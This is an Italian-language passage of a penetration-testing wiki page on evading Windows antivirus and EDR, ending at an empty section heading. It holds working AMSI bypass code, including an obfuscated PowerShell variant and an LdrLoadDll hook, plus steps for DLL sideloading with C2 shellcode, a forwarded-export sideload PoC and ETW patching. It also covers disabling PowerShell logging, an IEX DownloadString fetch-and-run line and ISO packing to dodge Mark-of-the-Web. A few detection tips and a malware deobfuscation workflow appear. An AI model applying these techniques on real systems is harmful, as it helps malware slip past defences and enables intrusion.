# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Questa pagina è stata scritta da** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Disabilitare Defender

- [defendnot](https://github.com/es3n1n/defendnot): Uno strumento per interrompere il funzionamento di Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Uno strumento per interrompere il funzionamento di Windows Defender fingendo un altro AV.
- [Disabilita Defender se sei admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

Attualmente gli AV utilizzano diversi metodi per verificare se un file è maligno o meno: static detection, dynamic analysis, e per gli EDR più avanzati, behavioural analysis.

### **Static detection**

La static detection si ottiene segnalando strings note maligne o array di byte in un binary o script, ed estraendo anche informazioni dal file stesso (es. file description, company name, digital signatures, icon, checksum, ecc.). Questo significa che usare strumenti pubblici noti può farti scoprire più facilmente, poiché probabilmente sono già stati analizzati e contrassegnati come maligni. Ci sono un paio di modi per aggirare questo tipo di rilevamento:

- **Encryption**

Se crittografi il binary, non ci sarà modo per gli AV di rilevare il tuo programma, ma avrai bisogno di un loader per decrittarlo ed eseguirlo in memoria.

- **Obfuscation**

A volte basta cambiare alcune strings nel tuo binary o script per superare gli AV, ma può essere un'operazione che richiede tempo a seconda di cosa stai cercando di offuscare.

- **Custom tooling**

Se sviluppi i tuoi strumenti non ci saranno firme note maligne, ma questo richiede molto tempo e sforzo.

> [!TIP]
> Un buon modo per verificare la static detection di Windows Defender è [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Fondamentalmente divide il file in più segmenti e poi chiede a Defender di scansionare ciascuno individualmente; in questo modo può dirti esattamente quali sono le strings o i byte segnalati nel tuo binary.

Consiglio vivamente di dare un'occhiata a questa [playlist YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sull'AV Evasion pratico.

### **Dynamic analysis**

La dynamic analysis è quando l'AV esegue il tuo binary in una sandbox e osserva attività maligne (es. provare a decrittare e leggere le password del browser, eseguire un minidump su LSASS, ecc.). Questa parte può essere un po' più difficile da gestire, ma ecco alcune cose che puoi fare per evadere le sandbox.

- **Sleep before execution** A seconda di come è implementato, può essere un ottimo modo per bypassare la dynamic analysis degli AV. Gli AV hanno pochissimo tempo per scansionare i file per non interrompere il flusso di lavoro dell'utente, quindi usare sleep lunghi può disturbare l'analisi dei binary. Il problema è che molte sandbox di AV possono semplicemente saltare la sleep a seconda di come è implementata.
- **Checking machine's resources** Di solito le sandbox hanno pochissime risorse (es. < 2GB RAM), altrimenti rallenterebbero la macchina dell'utente. Qui puoi essere creativo, per esempio controllando la temperatura della CPU o anche la velocità delle ventole; non tutto sarà implementato nella sandbox.
- **Machine-specific checks** Se vuoi targettare un utente la cui workstation è joinata al dominio "contoso.local", puoi controllare il dominio del computer per vedere se coincide con quello specificato; se non coincide, puoi far terminare il programma.

Si scopre che il nome del computer della Sandbox di Microsoft Defender è HAL9TH, quindi puoi verificare il nome del computer nel tuo malware prima della detonazione; se il nome corrisponde a HAL9TH significa che sei dentro la sandbox di Defender e puoi far terminare il programma.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>fonte: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Altri ottimi consigli da [@mgeeky](https://twitter.com/mariuszbit) per contrastare le Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> canale #malware-dev</p></figcaption></figure>

Come detto prima in questo post, gli strumenti pubblici alla fine verranno rilevati, quindi dovresti porti una domanda:

Per esempio, se vuoi dumpare LSASS, hai davvero bisogno di usare mimikatz? Oppure potresti usare un progetto diverso, meno conosciuto, che faccia comunque il dump di LSASS.

La risposta giusta è probabilmente la seconda. Prendendo mimikatz come esempio, è probabilmente uno dei pezzi di malware più segnalati dagli AV e dagli EDR, e sebbene il progetto sia molto interessante, è anche un incubo da usare per aggirare gli AV, quindi cerca semplicemente alternative per ciò che stai cercando di ottenere.

> [!TIP]
> Quando modifichi i tuoi payload per l'evasione, assicurati di disattivare l'invio automatico dei sample in automatico in Defender, e per favore, seriamente, NON CARICARE SU VIRUSTOTAL se il tuo obiettivo è ottenere evasione a lungo termine. Se vuoi controllare se il tuo payload viene rilevato da un AV particolare, installalo su una VM, prova a disattivare l'invio automatico dei sample e testalo lì finché non sei soddisfatto del risultato.

## EXEs vs DLLs

Quando possibile, dai sempre priorità all'uso di DLL per l'evasione; secondo la mia esperienza, i file DLL vengono in genere molto meno rilevati e analizzati, quindi è un trucco molto semplice per evitare il rilevamento in alcuni casi (se il tuo payload può essere eseguito come DLL ovviamente).

Come si vede in questa immagine, un DLL Payload di Havoc ha un tasso di rilevamento di 4/26 su antiscan.me, mentre l'EXE payload ha un tasso di rilevamento di 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>confronto su antiscan.me tra un normale Havoc EXE payload e un normale Havoc DLL</p></figcaption></figure>

Ora mostreremo alcuni trucchi che puoi usare con file DLL per essere molto più stealth.

## DLL Sideloading & Proxying

**DLL Sideloading** sfrutta l'ordine di ricerca delle DLL usato dal loader posizionando l'applicazione vittima e i payload maligni uno accanto all'altro.

Puoi controllare i programmi suscettibili a DLL Sideloading usando [Siofra](https://github.com/Cybereason/siofra) e lo script powershell seguente:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Questo comando restituirà la lista dei programmi suscettibili al DLL hijacking all'interno di "C:\Program Files\\" e i file DLL che tentano di caricare.

Consiglio vivamente di **explore DLL Hijackable/Sideloadable programs yourself**, questa tecnica è abbastanza stealthy se eseguita correttamente, ma se usi programmi DLL Sideloadable pubblicamente noti, potresti essere facilmente scoperto.

Semplicemente posizionando una DLL malevola con il nome che il programma si aspetta di caricare, non verrà automaticamente caricato il tuo payload, poiché il programma si aspetta alcune funzioni specifiche all'interno di quella DLL; per risolvere questo problema useremo un'altra tecnica chiamata **DLL Proxying/Forwarding**.

**DLL Proxying** inoltra le chiamate che un programma effettua dalla DLL proxy (e malevola) alla DLL originale, preservando così la funzionalità del programma e permettendo di gestire l'esecuzione del tuo payload.

Userò il progetto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) di [@flangvik](https://twitter.com/Flangvik/)

Questi sono i passaggi che ho seguito:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
L'ultimo comando ci darà due file: un template del codice sorgente della DLL e la DLL originale rinominata.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Questi sono i risultati:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Both our shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) and the proxy DLL have a 0/26 Detection rate in [antiscan.me](https://antiscan.me)! Lo definirei un successo.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ti **consiglio vivamente** di guardare [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) su DLL Sideloading e anche [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) per approfondire quanto abbiamo discusso.

### Abuso degli Export Inoltrati (ForwardSideLoading)

I moduli PE di Windows possono esportare funzioni che sono in realtà "forwarders": invece di puntare a codice, l'entry di export contiene una stringa ASCII della forma `TargetDll.TargetFunc`. Quando un chiamante risolve l'export, il loader di Windows farà:

- Caricare `TargetDll` se non è già caricato
- Risolvere `TargetFunc` da esso

Comportamenti chiave da comprendere:
- Se `TargetDll` è una KnownDLL, viene fornito dallo spazio dei nomi protetto KnownDLLs (es., ntdll, kernelbase, ole32).
- Se `TargetDll` non è una KnownDLL, viene usato il normale ordine di ricerca delle DLL, che include la directory del modulo che sta eseguendo la risoluzione del forward.

Questo abilita una primitive di sideloading indiretta: trovare una DLL firmata che esporta una funzione inoltrata a un nome di modulo non-KnownDLL, poi collocare insieme a quella DLL firmata una DLL controllata dall'attaccante con esattamente lo stesso nome del modulo target inoltrato. Quando l'export inoltrato viene invocato, il loader risolve il forward e carica la tua DLL dalla stessa directory, eseguendo il tuo DllMain.

Esempio osservato su Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` non è un KnownDLL, quindi viene risolta tramite l'ordine di ricerca normale.

PoC (copia-incolla): 1) Copiare la DLL di sistema firmata in una cartella scrivibile
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Posiziona un `NCRYPTPROV.dll` malevolo nella stessa cartella. Un DllMain minimale è sufficiente per ottenere l'esecuzione di codice; non è necessario implementare la funzione forwardata per attivare DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Attiva l'inoltro con un LOLBin firmato:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Comportamento osservato:
- rundll32 (signed) loads the side-by-side `keyiso.dll` (signed)
- Durante la risoluzione di `KeyIsoSetAuditingInterface`, il loader segue il forward a `NCRYPTPROV.SetAuditingInterface`
- Il loader quindi carica `NCRYPTPROV.dll` da `C:\test` ed esegue il suo `DllMain`
- Se `SetAuditingInterface` non è implementata, otterrai un errore "missing API" solo dopo che `DllMain` è già stato eseguito

Suggerimenti per l'hunting:
- Concentrati sui forwarded exports dove il modulo di destinazione non è un KnownDLL. KnownDLLs sono elencati sotto `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Puoi enumerare i forwarded exports con tooling such as:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Consulta l'inventario dei forwarder di Windows 11 per cercare candidati: https://hexacorn.com/d/apis_fwd.txt

Idee per rilevamento/difesa:
- Monitorare i LOLBins (es., rundll32.exe) che caricano DLL firmate da percorsi non di sistema, seguiti dal caricamento di non-KnownDLLs con lo stesso nome base da quella directory
- Generare avvisi su catene processo/modulo come: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` sotto percorsi scrivibili dall'utente
- Applicare politiche di integrità del codice (WDAC/AppLocker) e negare write+execute nelle directory delle applicazioni

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Puoi usare Freeze per caricare ed eseguire il tuo shellcode in modo furtivo.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> L'evasione è solo un gioco del gatto e del topo: ciò che funziona oggi potrebbe essere rilevato domani, quindi non fare mai affidamento su un unico strumento; se possibile, prova a concatenare più tecniche di evasione.

## AMSI (Anti-Malware Scan Interface)

AMSI è stato creato per prevenire "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Inizialmente, gli AVs erano in grado di scannerizzare solo **files on disk**, quindi se in qualche modo potevi eseguire payloads **directly in-memory**, l'AV non poteva fare nulla per impedirlo, perché non aveva sufficiente visibilità.

La funzionalità AMSI è integrata in questi componenti di Windows.

- User Account Control, or UAC (elevazione di EXE, COM, MSI, o installazione ActiveX)
- PowerShell (script, uso interattivo, e valutazione dinamica del codice)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Permette alle soluzioni antivirus di ispezionare il comportamento degli script esponendo i contenuti degli script in una forma non cifrata e non obfuscata.

Eseguire `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` produrrà il seguente avviso su Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Nota come prepone `amsi:` e poi il percorso dell'eseguibile da cui lo script è stato lanciato, in questo caso, powershell.exe

Non abbiamo scritto alcun file su disco, ma siamo comunque stati intercettati in-memory a causa di AMSI.

Inoltre, a partire da **.NET 4.8**, anche il codice C# viene processato da AMSI. Questo interessa persino `Assembly.Load(byte[])` per l'esecuzione in-memory. Per questo motivo è consigliato usare versioni inferiori di .NET (come 4.7.2 o inferiori) per l'esecuzione in-memory se si vuole evadere AMSI.

Ci sono un paio di modi per aggirare AMSI:

- **Obfuscation**

Dato che AMSI lavora principalmente con rilevamenti statici, modificare gli script che cerchi di caricare può essere un buon modo per evadere il rilevamento.

Tuttavia, AMSI ha la capacità di unobfuscating gli script anche se hanno più livelli di offuscamento, quindi l'obfuscation potrebbe essere una cattiva opzione a seconda di come viene fatta. Questo la rende non così semplice da eludere. Anche se, a volte, tutto ciò che serve è cambiare un paio di nomi di variabili e sei a posto, quindi dipende da quanto qualcosa è stato flaggato.

- **AMSI Bypass**

Poiché AMSI è implementato caricando una DLL nel processo powershell (anche cscript.exe, wscript.exe, ecc.), è possibile manometterla facilmente anche eseguendo come utente non privilegiato. A causa di questa falla nell'implementazione di AMSI, i ricercatori hanno trovato diversi modi per evadere la scansione AMSI.

**Forcing an Error**

Forzare il fallimento dell'inizializzazione di AMSI (amsiInitFailed) farà sì che non venga avviata alcuna scansione per il processo corrente. Originariamente questo è stato divulgato da [Matt Graeber](https://twitter.com/mattifestation) e Microsoft ha sviluppato una signature per prevenirne l'uso più diffuso.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
È bastata una riga di codice powershell per rendere AMSI inutilizzabile per l'attuale processo powershell. Questa riga è naturalmente stata rilevata dallo stesso AMSI, quindi è necessaria qualche modifica per poter utilizzare questa tecnica.

Ecco un AMSI bypass modificato che ho preso da questo [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Tieni presente che probabilmente questo verrà segnalato una volta pubblicato il post, quindi non dovresti pubblicare alcun codice se il tuo obiettivo è rimanere non rilevato.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> Leggi [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) per una spiegazione più dettagliata.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI is initialised only after `amsi.dll` is loaded into the current process. A robust, language‑agnostic bypass is to place a user‑mode hook on `ntdll!LdrLoadDll` that returns an error when the requested module is `amsi.dll`. As a result, AMSI never loads and no scans occur for that process.

Schema di implementazione (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Note
- Funziona su PowerShell, WScript/CScript e loader personalizzati allo stesso modo (qualsiasi cosa che altrimenti caricherebbe AMSI).
- Abbinalo all'invio di script tramite stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) per evitare artefatti di riga di comando lunghi.
- Visto usato da loader eseguiti tramite LOLBins (es., `regsvr32` che chiama `DllRegisterServer`).

This tools [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**Rimuovere la firma rilevata**

Puoi usare uno strumento come **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** e **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** per rimuovere la firma AMSI rilevata dalla memoria del processo corrente. Questo strumento funziona scansionando la memoria del processo corrente alla ricerca della firma AMSI e poi sovrascrivendola con istruzioni NOP, rimuovendola effettivamente dalla memoria.

**AV/EDR products that uses AMSI**

Puoi trovare una lista di prodotti AV/EDR che usano AMSI in **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Usare PowerShell versione 2**
Se usi PowerShell versione 2, AMSI non verrà caricato, quindi puoi eseguire i tuoi script senza che vengano scansionati da AMSI. Puoi farlo:
```bash
powershell.exe -version 2
```
## Registrazione di PowerShell

PowerShell logging è una funzionalità che permette di registrare tutti i comandi PowerShell eseguiti su un sistema. Questo può essere utile per scopi di auditing e troubleshooting, ma può anche rappresentare un problema per gli attacker che vogliono evadere il rilevamento.

Per bypassare la registrazione di PowerShell, puoi usare le seguenti tecniche:

- **Disable PowerShell Transcription and Module Logging**: puoi usare uno strumento come [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) per questo scopo.
- **Use Powershell version 2**: se usi PowerShell version 2, AMSI non verrà caricato, quindi puoi eseguire i tuoi script senza essere scansionato da AMSI. Puoi fare così: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: usa [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) per spawnare una powershell senza difese (questo è ciò che usa `powerpick` di Cobal Strike).


## Offuscamento

> [!TIP]
> Diverse tecniche di offuscamento si basano sulla cifratura dei dati, il che aumenterà l'entropia del binario rendendo più facile per AVs ed EDRs individuarlo. Fai attenzione a questo e valuta di applicare la cifratura solo a sezioni specifiche del tuo codice che sono sensibili o che devono essere nascoste.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Quando si analizza malware che utilizza ConfuserEx 2 (o fork commerciali) è comune trovarsi di fronte a diversi livelli di protezione che bloccheranno i decompilatori e le sandbox. Il workflow qui sotto ripristina in modo affidabile un IL quasi originale che può successivamente essere decompilato in C# con strumenti come dnSpy o ILSpy.

1.  Rimozione anti-tampering – ConfuserEx cripta ogni *method body* e lo decripta all'interno del costruttore statico del *module* (`<Module>.cctor`). Questo modifica anche il checksum del PE così qualsiasi modifica farà crashare il binario. Usa **AntiTamperKiller** per individuare le tabelle di metadata criptate, recuperare le chiavi XOR e riscrivere un assembly pulito:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
L'output contiene i 6 parametri anti-tamper (`key0-key3`, `nameHash`, `internKey`) che possono essere utili quando costruisci il tuo unpacker.

2.  Ripristino di simboli / control-flow – passa il file *clean* a **de4dot-cex** (un fork di de4dot consapevole di ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flag:
• `-p crx` – seleziona il profilo ConfuserEx 2
• de4dot annullerà il control-flow flattening, ripristinerà namespace, classi e nomi di variabili originali e decripterà le stringhe costanti.

3.  Rimozione delle proxy-call – ConfuserEx sostituisce le chiamate dirette ai metodi con wrapper leggeri (cioè *proxy calls*) per ostacolare ulteriormente la decompilazione. Rimuovile con **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Dopo questo passaggio dovresti osservare API .NET normali come `Convert.FromBase64String` o `AES.Create()` invece di funzioni wrapper opache (`Class8.smethod_10`, …).

4.  Pulizia manuale – esegui il binario risultante in dnSpy, cerca grandi blob Base64 o l'uso di `RijndaelManaged`/`TripleDESCryptoServiceProvider` per individuare il payload reale. Spesso il malware lo memorizza come un array di byte codificato TLV inizializzato dentro `<Module>.byte_0`.

La catena sopra ripristina il flusso di esecuzione **senza** la necessità di eseguire il campione malevolo – utile quando si lavora su una workstation offline.

> 🛈  ConfuserEx produce un attributo custom chiamato `ConfusedByAttribute` che può essere usato come IOC per triage automatico dei sample.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): L'obiettivo di questo progetto è fornire un fork open-source della suite di compilazione [LLVM](http://www.llvm.org/) in grado di aumentare la sicurezza del software tramite [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) e tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator mostra come usare il linguaggio `C++11/14` per generare, al momento della compilazione, obfuscated code senza usare strumenti esterni e senza modificare il compilatore.
- [**obfy**](https://github.com/fritzone/obfy): Aggiunge un livello di obfuscated operations generate dal framework di metaprogrammazione template di C++ che renderà la vita di chi vuole crackare l'applicazione un po' più difficile.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz è un obfuscator binario x64 in grado di offuscare diversi file PE, inclusi: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame è un semplice motore di metamorphic code per eseguibili generici.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator è un framework di code obfuscation a grana fine per linguaggi supportati da LLVM che utilizza ROP (return-oriented programming). ROPfuscator offusca un programma a livello di codice assembly trasformando istruzioni regolari in ROP chains, ostacolando la nostra naturale concezione del flusso di controllo normale.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt è un .NET PE Crypter scritto in Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor è in grado di convertire EXE/DLL esistenti in shellcode e poi caricarli

## SmartScreen & MoTW

Potresti aver visto questa schermata quando scarichi ed esegui alcuni eseguibili da internet.

Microsoft Defender SmartScreen è un meccanismo di sicurezza progettato per proteggere l'utente finale dall'esecuzione di applicazioni potenzialmente dannose.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen funziona principalmente con un approccio basato sulla reputazione, il che significa che applicazioni scaricate raramente attiveranno SmartScreen, avvisando e impedendo all'utente finale di eseguire il file (anche se il file può comunque essere eseguito cliccando More Info -> Run anyway).

**MoTW** (Mark of The Web) è un [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) con il nome Zone.Identifier che viene creato automaticamente al download di file da internet, insieme all'URL da cui è stato scaricato.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Controllo dell'ADS Zone.Identifier per un file scaricato da internet.</p></figcaption></figure>

> [!TIP]
> È importante notare che gli eseguibili firmati con un certificato di firma **trusted** **non attiveranno SmartScreen**.

Un modo molto efficace per impedire che i tuoi payload ottengano il Mark of The Web è impacchettarli dentro un tipo di contenitore come un ISO. Questo accade perché Mark-of-the-Web (MOTW) **non può** essere applicato a volumi **non NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) è uno strumento che impacchetta payloads in contenitori di output per evadere Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Ecco una demo per bypassare SmartScreen impacchettando payload all'interno di file ISO usando [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) è un potente meccanismo di logging in Windows che permette alle applicazioni e ai componenti di sistema di **registrare eventi**. Tuttavia, può anche essere usato dai prodotti di sicurezza per monitorare e rilevare attività malevole.

Similmente a come AMSI viene disabilitato (bypassed) è anche possibile fare in modo che la funzione **`EtwEventWrite`** del processo in user space ritorni immediatamente senza registrare alcun evento. Questo si ottiene patchando la funzione in memoria per farla ritornare immediatamente, disabilitando di fatto il logging ETW per quel processo.

Puoi trovare maggiori informazioni in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) e [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Caricare binari C# in memoria è noto da tempo ed è ancora un ottimo modo per eseguire i tuoi strumenti di post-exploitation senza essere rilevati dall'AV.

Poiché il payload verrà caricato direttamente in memoria senza toccare il disco, dovremo preoccuparci solo di patchare AMSI per l'intero processo.

La maggior parte dei framework C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, ecc.) fornisce già la possibilità di eseguire assembly C# direttamente in memoria, ma ci sono diversi modi per farlo:

- **Fork\&Run**

Coinvolge la creazione di un nuovo processo sacrificiale, l'iniezione del tuo codice malevolo di post-exploitation in quel processo, l'esecuzione del codice e, al termine, la terminazione del processo. Questo ha vantaggi e svantaggi. Il vantaggio del metodo fork and run è che l'esecuzione avviene **fuori** dal processo del nostro Beacon implant. Questo significa che se qualcosa nella nostra azione di post-exploitation va storto o viene scoperto, c'è una **probabilità molto più alta** che il nostro **implant** sopravviva. Lo svantaggio è che hai una **probabilità maggiore** di essere rilevato dalle **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Consiste nell'iniettare il codice malevolo di post-exploitation **nel suo stesso processo**. In questo modo puoi evitare di creare un nuovo processo e farlo scansionare dall'AV, ma lo svantaggio è che se qualcosa va storto durante l'esecuzione del tuo payload, c'è una **probabilità molto più alta** di **perdere il tuo beacon** perché potrebbe andare in crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Se vuoi saperne di più sul caricamento di Assembly C#, consulta questo articolo [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) e il loro InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Puoi anche caricare Assembly C# **da PowerShell**, guarda [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) e [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Uso di altri linguaggi di programmazione

